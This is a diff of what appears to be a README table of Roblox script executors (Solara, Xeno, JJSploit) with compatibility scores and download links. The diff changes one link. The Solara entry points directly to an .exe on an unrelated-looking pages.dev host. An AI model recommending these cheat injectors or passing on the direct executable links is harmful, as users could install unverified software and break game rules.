@@ -9,5 +9,5 @@ Some games need to be published in order to work properly. Remember to do that i
 | Executor | Level | UNC | sUNC |
 | ------- | ------ | ---- | ---- |
 | [Solara](https://60aaf9c6.salamanderprocessing.pages.dev/download/static/files/BootstrapperNew.exe) | 3 | 66% | 50 - 60% |
-| [Xeno](https://discord.gg/getxeno) | 3 | 81% | 41% |
+| [Xeno](https://xeno.now) | 3 | 81% | 41% |
 | [JJSploit](https://wearedevs.net/d/JJSploit) | 3 | ? | 40% |
